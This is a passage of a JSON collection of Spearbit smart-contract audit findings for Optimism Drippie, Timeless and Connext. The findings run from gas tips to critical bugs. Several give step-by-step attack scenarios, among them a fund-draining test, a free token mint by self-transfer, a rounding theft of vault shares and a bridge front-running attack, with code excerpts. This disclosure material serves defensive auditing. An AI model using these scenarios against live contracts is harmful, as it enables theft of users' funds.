attacker); // Steal all the funds vm.prank(attacker); drippie.withdrawETH(payable(attacker)); // Assert we have drained Drippie assertEq(attacker.balance, 10 ether); assertEq(address(drippie).balance, 0 ether); }",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use calldata over memory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Some gas savings if function arguments are passed as calldata instead of memory.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Avoid String names in Events and Mapping Key",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Drip events emit an indexed nameref and the name as a string. These strings must be passed into every drip call adding to gas costs for larger strings.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Avoid Extra sloads on Drippie.status",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Information for emitting event can be taken from calldata instead of reading from storage. Can skip repeat drips[_name].status reads from storage.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use Custom Errors Instead of Strings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "To save some gas the use of custom errors leads to cheaper deploy time cost and run time cost. The run time cost is only relevant when the revert condition is met.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Increment In The For Loop Post Condition In An Unchecked Block",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "This is only relevant if you are using the default solidity checked arithmetic. i++ involves checked arithmetic, which is not required. This is because the value of i is always strictly less than length <= 2**256 - 1. Therefore, the theoretical maximum value of i to enter the for-loop body is 2**256 - 2. This means that the i++ in the for loop can never overflow. Regardless, the overflow checks are performed by the compiler. Unfortunately, the Solidity optimizer is not smart enough to detect this and remove the checks. One can manually do this by: for (uint i = 0; i < length; ) { // do something that doesn't change the value of i unchecked { ++i; } }",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "DripState.count Location and Use",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "DripState.count is recorded and never used within the Drippie or IDripCheck contracts. DripState.count is also incremented after all external calls, inconsistent with Checks, Effects, Interactions con- vention.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Type Checking Foregone on DripCheck",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Passing params as bytes makes for a flexible DripCheck, however, type checking is lost.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Confirm Blind ERC721 Transfers are Intended",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "AssetReceiver uses transferFrom instead of safeTransferFrom. The callback on safeTransferFrom often poses a reentrancy risk but in this case the function is restricted to onlyOwner.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code Contains Empty Blocks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Its best practice that when there is an empty block, to add a comment in the block explaining why its empty. While not technically errors, they can cause confusion when reading code.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code Structure Deviates From Best-Practice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The best-practice layout for a contract should follow this order:  State variables.  Events.  Modifiers.  Constructor.  Functions. Function ordering helps readers identify which functions they can call and find constructor and fallback functions easier. Functions should be grouped according to their visibility and ordered as: constructor, receive function (if ex- ists), fallback function (if exists), external, public, internal, private. Some constructs deviate from this recommended best-practice: structs and mappings after events.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing or Incomplete NatSpec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Checking Boolean Against Boolean",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "executable returns a boolean in which case the comparison to true is unnecessary. executable also reverts if any precondition check fails in which case false will never be returned.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Drippie.executable Never Returns false Only true or Reverts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "executable(string memory _name) public view returns (bool). The executable implemented in the Drippie contract has the following signature From the signature and the natspec documentation @return True if the drip is executable, false other- wise. Without reading the code, a user/developer would expect that the function returns true if all the checks passes otherwise false but in reality the function will always return true or revert. Because of this behavior, a reverting drip that do not pass the requirements inside executable will never revert with the message present in the following code executed by the drip function require( executable(_name) == true, \"Drippie: drip cannot be executed at this time, try again later\" );",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Drippie Use Case Notes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Drippie intends to support use cases outside of the initial hot EOA top-up use case demonstrated by Optimism. To further clarify, weve noted that drips support:  Sending eth  External function calls with fixed params  Preconditions Examples include, conditionally transferring eth or tokens. Calling an admin function iff preconditions are met. Drips do not support:  Updating the drip contract storage  Altering params  Postconditions Examples include, vesting contracts or executing Uniswap swaps based on recent moving averages (which are not without their own risks). Where dynamic params or internal accounting is needed, a separate contract needs to be paired with the drip.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Augment Documentation for dripcheck.check Indicating Precondition Check Only Performed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Before executing the whole batch of actions the drip function call executable that check if the drip can be executed. Inside executable an external contract is called by this instruction require( state.config.dripcheck.check(state.config.checkparams), \"Drippie: dripcheck failed so drip is not yet ready to be triggered\" ); Optimism provided some examples like checking if a target balance is below a specific threshold or above that threshold, but in general, the dripcheck.check invocation could perform any kind of checks. The important part that should be clear in the natspec documentation of the drip function is that that specific check is performed only once before the execution of the bulk of actions.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Considerations on the drip state.last and state.config.interval values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "When the drip function is called by an external actor, the executable is executed to check if the drip meets all the needed requirements to be executed. The only check that is done regarding the drip state.last and state.config.interval is this require( state.last + state.config.interval <= block.timestamp, \"Drippie: drip interval has not elapsed since last drip\" ); The state.time is never really initialized when the create function is called, this means that it will be automatically initialized with the default value of the uint256 type: 0.  Consideration 1: Drips could be executed as soon as created Depending on the value set to state.config.interval the executables logic implies that as soon as a drip is created, the drip can be immediately (even in the same transaction) executed via the drip function.  Consideration 2: A very high value for interval could make the drip never executable block.timestamp represents the number of seconds that passed since Unix Time (1970-01-01T00:00:00Z). When the owner of the Drippie want to create a \"one shot\" drip that can be executed immediately after creation but only once (even if the owner forgets to set the drips status to ARCHIVED) he/she should be aware that the max value that he/she can use for the interval is at max block.timestamp. This mean that the second time the drip can be executed is after block.timestamp seconds have been passed. If, for example, the owner create right now a drip with interval = block.timestamp it means that after the first execution the same drip could be executed after ~52 years (~2022-1970).",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Support ERC1155 in AssetReceiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "AssetReceiver support ERC20 and ERC721 interfaces but not ERC1155.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reorder DripStatus Enum for Clarity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The current implementation of Drippie contract has the following enum type: enum DripStatus { NONE, // uint8(0) ACTIVE, PAUSED, ARCHIVED } When a drip is created via the create function, its status is initialized to PAUSED (equal to uint8(2)) and when it gets activated its status is changed to ACTIVE (equal to uint8(1)) So, the status change from 0 (NONE) to 2 (PAUSED) to 1 (ACTIVE). Switching the order inside the enum DripStatus definition between PAUSED and ACTIVE would make it more clean and easier to understand.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "_gas is Unneeded as Transactor.CALL and Transactor.DELEGATECALL Function Argument",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The caller (i.e. contract owner) can control desired amount of gas at the transaction level.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Licensing Conflict on Inherited Dependencies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Solmate contracts are AGPL Licensed which is incompatible with the MIT License of Drippie related contracts.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename Functions for Clarity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "status The status(string memory _name, DripStatus _status) function allows the owner to update the status of a drip. The purpose of the function, based on the name, is not obvious at first sight and could confuse a user into believing that its a view function to retrieve the status of a drip instead of mutating its status. executable The executable(string memory _name) public view returns (bool) function returns true if the drip with name _name can be executed.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Owner Has Permission to Drain Value from Drippie Contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenarios.  Scenario 1 Owner may create arbitrary drips, including a drip to send all funds to themselves.  Scenario 2 AssetReceiver permits owner to withdraw ETH, ERC20 tokens, and ERC721 tokens.  Scenario 3 Owner may execute arbitrary calls. Transactor.CALL function is a function that allows the owner of the contract to execute a \"general purpose\" low- level call. function CALL( address _target, bytes memory _data, uint256 _gas, uint256 _value ) external payable onlyOwner returns (bool, bytes memory) { return _target.call{ gas: _gas, value: _value }(_data); } The function will transfer _value ETH present in the contract balance to the _target address. The function is also payable and this mean that the owner can send along with the call some funds. Test example showcasing the issue: 23 function test_transactorCALLAllowOwnerToDrainDrippieContract() public { bool success; vm.deal(deployer, 0 ether); vm.deal(bob, 0 ether); vm.deal(address(drippie), 1 ether); vm.prank(deployer); // send 1 ether via `call` to a contract that cannot receive them (success, ) = drippie.CALL{value: 0 ether}(bob, \"\", 100000, 1 ether); assertEq(success, true); assertEq(address(drippie).balance, 0 ether); assertEq(bob.balance, 1 ether); }",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mint PerpetualYieldTokens for free by self-transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The PYT.transfer and transferFrom functions operate on cached balance values. When transfer- ring tokens to oneself the decreased balance is overwritten by an increased balance which makes it possible to mint PYT tokens for free. Consider the following exploit scenario:  Attacker A self-transfers by calling token.transfer(A, token.balanceOf(A)).  balanceOf[msg.sender] is rst set to zero but then overwritten by balanceOf[to] = toBalance + amount, doubling As balance.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "xPYT auto-compound does not take pounder reward into account",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "Conceptually, the xPYT.pound function performs the following steps: 1. Claims yieldAmount yield for itself, deposits the yield back to receive more PYT/NYT (Gate.claimYieldEnter). 2. Buys xPYT with the NYT. 3. Performs a ERC4626.redeem(xPYT) with the bought amount, burning xPYT and receiving pytAmountRedeemed PYT. 4. Performs a ERC4626.deposit(pytAmountRedeemed + yieldAmount = pytCompounded). 5. Pays out a reward in PYT to the caller. The assetBalance is correctly updated for the rst four steps but does not decrease by the pounder reward which is transferred out in the last step. The impact is that the contract has a smaller assets (PYT) balance than what is tracked in assetBalance. 1. Future depositors will have to make up for it as sweep computes the difference between these two values. 2. The xPYT exchange ratio is wrongly updated and withdrawers can redeem xPYT for more assets than they should until the last withdrawer is left holding valueless xPYT. Consider the following example and assume 100% fees for simplicity i.e. pounderReward = pytCompounded.  Vault total: 1k assets, 1k shares total supply.  pound with 100% fee:  claims Y PYT/NYT.  swaps Y NYT to X xPYT.  redeems X xPYT for X PYT by burning X xPYT (supply -= X, exchange ratio is 1-to-1 in example).  assetBalance is increased by claimed Y PYT  pounder receives a pounder reward of X + Y PYT but does not decrease assetBalance by pounder reward X+Y.  Vault totals should be 1k-X assets, 1k-X shares, keeping the same share price.  Nevertheless, vault totals actually are 1k+Y assets, 1k-X shares. Although pounder receives 100% of pound- ing rewards the xPYT price (assets / shares) increased.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Wrong yield accumulation in claimYieldAndEnter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The claimYieldAndEnter function does not accrue yield to the Gate contract itself (this) in case xPYT was specied. The idea is to accrue yield for the mint recipient rst before increasing/reducing their balance to not interfere with the yield rewards computation. However, in case xPYT is used, tokens are minted to the Gate before its yield is accrued. Currently, the transfer from this to xPYT through the xPYT.deposit call accrues yield for this after the tokens have been minted to it (userPYTBalance * (updatedYieldPerToken - actualUserYieldPerToken) / PRECI- SION) and its balance increased. This leads to it receiving a larger yield amount than it should have.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Swapper left-over token balances can be stolen",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The Swapper contract may never have any left-over token balances after performing a swap because token balances can be stolen by anyone in several ways:  By using Swapper.doZeroExSwap with useSwapperBalance and tokenOut = tokenToSteal  Arbitrary token approvals to arbitrary spenders can be set on behalf of the Swapper contract using UniswapV3Swapper.swapUnderlyingToXpyt.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: High Risk"
        ]
    },
    {
        "title": "TickMath might revert in solidity version 0.8",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "UniswapV3s TickMath library was changed to allow compilations for solidity version 0.8. However, adjustments to account for the implicit overow behavior that the contract relies upon were not performed. The In UniswapV3xPYT.sol is compiled with version 0.8 and indirectly uses this library through the OracleLibrary. the worst case, it could be that the library always reverts (instead of overowing as in previous versions), leading to a broken xPYT contract. The same pragma solidity >=0.5.0; instead of pragma solidity >=0.5.0 <0.8.0; adjustments have been made for the OracleLibrary and PoolAddress contracts. However, their code does not rely on implicit overow behavior.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Rounding issues when exiting a vault through shares",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "When exiting a vault through Gate.exitToVaultShares the user species a vaultSharesAmount. The amount of PYT&NYT to burn is determined by a burnAmount = _vaultSharesAmountToUnderlying- this function in derived YearnGate and ERC4626 Amount(vaultSharesAmount) call. All contracts round down the burnAmount. This means one needs to burn fewer amounts than the value of the received vault shares. implementations of This attack can be protable and lead to all vault shares being stolen If the gas costs of this attack are low. This can be the case with vault & underlying tokens with a low number of decimals, highly valuable shares, or cheap gas costs. Consider the following scenario: 7  Imagine the following vault assets: totalAssets = 1.9M, supply = 1M. Therefore, 1 share is theoretically worth 1.9 underlying.  Call enterWithUnderlying(underlyingAmount = 1900) to mint 1900 PYT/NYT (and the gate receives 1900 * supply / totalAssets = 1000 vault shares).  Call exitToVaultShares(vaultSharesAmount = 1), then burnAmount = shares.mulDivDown(totalAssets(), supply) = 1 * totalAssets / supply = 1. This burns 1 \"underlying\" (actually PYT/NYT but they are 1-to-1), but receive 1 vault share (worth 1.9 underlying). Repeat this for up to the minted 1900 PYT/NYT.  Can redeem the 1900 vault shares for 3610 underlying directly at the vault, making a prot of 3610 - 1900 = 1710 underlying.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Possible outstanding allowances from Gate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The vault parameter of Gate.enterWithUnderlying can be chosen by an attacker in such a way that underlying = vault.asset() is another vault token of the Gate itself. The subsequent _depositInto- Vault(underlying, underlyingAmount, vault) call will approve underlyingAmount of underlying tokens to the provided vault and could in theory allow stealing from other vault shares. This is currently only exploitable in very rare cases because the caller also has to transfer the underlyingAmount to the gate contract rst. For example, when transferring underlyingAmount = type(uint256).max is possible due to ashloans/ashmints and the vault shares implement approvals in a way that do not decrease anymore if the allowance is type(uint256).max, as is the case with ERC4626 vaults.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Factory.sol owner can change fees unexpectedly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The Factory.sol owner may be able to front run yield calculations in a gate implementation and change user fees unexpectedly.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Low uniswapV3TwapSecondsAgo may result in AMM manipulation in pound()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The lower the value of uniswapV3TwapSecondsAgo is set with at construction creation time the easier It becomes easier for attackers to it becomes for an attacker to manipulate the results of the pound() function. manipulate automated market maker price feeds with a lower time horizon, requiring less capital to manipulate prices, although users may simply not use an xPYT contract that sets uniswapV3TwapSecondsAgo too low.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "UniswapV3Swapper uses wrong allowance check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "Before the UniswapV3Swapper can exit a gate, it needs to set an XPYT allowance to the gate. The following check determines if an approval needs to be set: if ( args.xPYT.allowance(address(this), address(args.gate)) < tokenAmountOut ) { args.xPYT.safeApprove(address(args.gate), type(uint256).max); } args.gate.exitToUnderlying( args.recipient, args.vault, args.xPYT, tokenAmountOut ); The tokenAmountOut is in an underlying token amount but A legitimate gate.exitToUnderlying address(swapper)) checks allowance[swapper][gate] >= previewWithdraw(tokenAmountOut). is compared against an xPYT shares amount. xPYT.withdraw(tokenAmountOut, address(gate), call will call",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing check that tokenIn and tokenOut are different",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The doZeroExSwap() function takes in two ERC20 addresses which are tokenIn and tokenOut. The problem is that the doZeroExSwap() function does not check if the two token addresses are different from one another. Adding this check can reduce possible attack vectors.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Gate.sol gives unlimitted ERC20 approval on pyt for arbitrary address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "A malicious contract may be passed into the claimYieldAndEnter() function as xPYT and given full control over any PYT the contract may ever hold. Even though PYT is validated to be a real PYT contract and the Gate.sol contract isnt expected to have any PYT in it, it would be safer to remove any unnecessary approvals.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Constructor function does not check for zero address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The constructor function does not check if the addresses passed in are zero addresses. This check can guard against errors during deployment of the contract.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Accruing yield to msg.sender is not required when minting to xPYT contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The _exit function always accrues yield to the msg.sender before burning new tokens. The idea is to accrue yield for the recipient rst before increasing/reducing their balance to not interfere with the yield rewards computation. However, in case xPYT is used, tokens are burned on the Gate and not msg.sender.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unlocked solidity pragmas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "Most of the implementation code uses a solidity pragma of 0.8.4. contracts that use different functions. Unlocked solidity pragmas can result in unexpected behaviors or errors with different compiler versions.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "No safeCast in UniswapV3Swappers _swap.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "It should be noted that solidity version 0.8.0 doesnt revert on overow when type-casting. For example, if you tried casting the value 129 from uint8 to int8, it would overow to -127 instead. This is because signed integers have a lower positive integer range compared to unsigned integers i.e -128 to 127 for int8 versus 0 to 255 for uint8.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "One step critical address change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "Setting the owner in Ownable is a one-step transaction. This situation enables the scenario of contract functionality becoming inaccessible or making it so a malicious address that was accidentally set as owner could compromise the system.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing zero address checks in transfer and transferFrom functions.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The codebase uses solmates ERC-20 implementation. It should be noted that this library sacrices user safety for gas optimization. As a result, their ERC-20 implementation doesnt include zero address checks on transfer and transferFrom functions.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "Should add indexed keyword to deployed xPYT event",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The DeployXPYT event only has the ERC20 asset_ marked as indexed while xPYT deployed can also have the indexed key word since you can use up to three per event and it will make it easier for bots to interact off chain with the protocol.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing check that tokenAmountIn is larger than zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "In doZeroExSwap() there is no check that the tokenAmountIn number is larger than zero. Adding this check can add more thorough validation within the function.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "ERC20 does not emit Approval event in transferFrom",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The ERC20 contract does not emit new Approval events with the updated allowance in transferFrom. This makes it impossible to track approvals solely by looking at Approval events.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use the ofcial UniswapV3 0.8 branch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The current repositories create local copies of UniswapV3s codebase and manually migrate the contracts to Solidity 0.8.  For FullMath.sol this also leads to some small gas optimizations in this LOC as it uses 0 instead of type(uint256).max + 1.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "No checks that provided xPYT matches PYT of the provided vault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The Gate contracts has many functions that allow specifying vault and a xPYT addresses as pa- rameter. The underlying of the xPYT address is assumed to be the same as the vaults PYT but this check is not enforced. Users that call the Gate functions with an xPYT contract for the wrong vault could see their de- posit/withdrawals lost.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "Protocol does not work with non-standard ERC20 tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "Some ERC20 tokens make modications to their ERC20s transfer or balanceOf functions. One kind include deationary tokens that charge certain fee for every transfer or transferFrom. Others are rebasing tokens that increase in balance over time. Using these tokens in the protocol can lead to issues such as:  Entering a vault through the Gate will not work as it tries to deposit the pre-fee amount instead of the received post-fee amount.  The UniswapV3Swapper tries to enter a vault with the pre-fee transfer amount.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lack of transferId Verification Allows an Attacker to Front-Run Bridge Transfers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The onReceive() function does not verify the integrity of transferId against all other parameters. Although the onlyBridgeRouter modifier checks that the call originates from another BridgeRouter (assuming a correct configuration of the whitelist) to the onReceive() function, it does not check that the call originates from another Connext Diamond. Therefore, allowing anyone to send arbitrary data to BridgeRouter.sendToHook(), which is later interpreted as the transferId on Connexts NomadFacet.sol contract. This can be abused by a front-running attack as described in the following scenario:  Alice is a bridge user and makes an honest call to transfer funds over to the destination chain.  Bob does not make a transfer but instead calls the sendToHook() function with the same _extraData but passes an _amount of 1 wei.  Both Alice and Bob have their tokens debited on the source chain and must wait for the Nomad protocol to optimistically verify incoming TransferToHook messages.  Once the messages have been replicated onto the destination chain, Bob processes the message before Alice, causing onReceive() to be called on the same transferId.  However, because _amount is not verified against the transferId, Alice receives significantly less tokens and the s.reconciledTransfers mapping marks the transfer as reconciled. Hence, Alice has effectively lost all her tokens during an attempt to bridge them. function onReceive( uint32, // _origin, not used uint32, // _tokenDomain, not used bytes32, // _tokenAddress, of canonical token, not used address _localToken, uint256 _amount, bytes memory _extraData ) external onlyBridgeRouter { bytes32 transferId = bytes32(_extraData); // Ensure the transaction has not already been handled (i.e. previously reconciled). if (s.reconciledTransfers[transferId]) { revert NomadFacet__reconcile_alreadyReconciled(); } // Mark the transfer as reconciled. s.reconciledTransfers[transferId] = true; Note: the same issues exists with _localToken. As a result a malicious user could perform the same attack by using a malicious token contract and transferring the same amount of tokens in the call to sendToHook().",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "swapOut allows overwrite of token balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The StableSwapFacet has the function swapExactOut() where a user could supply the same as- setIn address as assetOut, which means the TokenIndexes for tokenIndexFrom and tokenIndexTo function swapOut() are the same. In function swapOut() a temporay array is used to store balances. When updating such balances, first self.balances[tokenIndexFrom] is updated and then self.balances[tokenIndexTo] is updated afterwards. However when tokenIndexFrom == tokenIndexTo the second update overwrites the first update, causing token balances to be arbitrarily lowered. This also skews the exchange rates, allowing for swaps where value can be extracted. Note: the protection against this problem is location in function getY(). However, this function is not called from swapOut(). Note: the same issue exists in swapInternalOut(), which is called from swapFromLocalAssetIfNeededForEx- actOut() via _swapAssetOut(). However, via this route it is not possible to specify arbitrary token indexes. There- fore, there isnt an immediate risk here. 7 contract StableSwapFacet is BaseConnextFacet { ... function swapExactOut(... ,address assetIn, address assetOut, ... ) ... { return s.swapStorages[canonicalId].swapOut( getSwapTokenIndex(canonicalId, assetIn), getSwapTokenIndex(canonicalId, assetOut), amountOut, maxAmountIn // assetIn could be same as assetOut ); } ... } library SwapUtils { function swapOut(..., uint8 tokenIndexFrom, uint8 tokenIndexTo, ... ) ... { ... uint256[] memory balances = self.balances; ... self.balances[tokenIndexFrom] = balances[tokenIndexFrom].add(dx).sub(dxAdminFee); self.balances[tokenIndexTo] = balances[tokenIndexTo].sub(dy); // overwrites previous update if ,! From==To ... } function getY(..., uint8 tokenIndexFrom, uint8 tokenIndexTo, ... ) ... { ... require(tokenIndexFrom != tokenIndexTo, \"compare token to itself\"); // here is the protection ... } } Below is a proof of concept which shows that the balances of index 3 can be 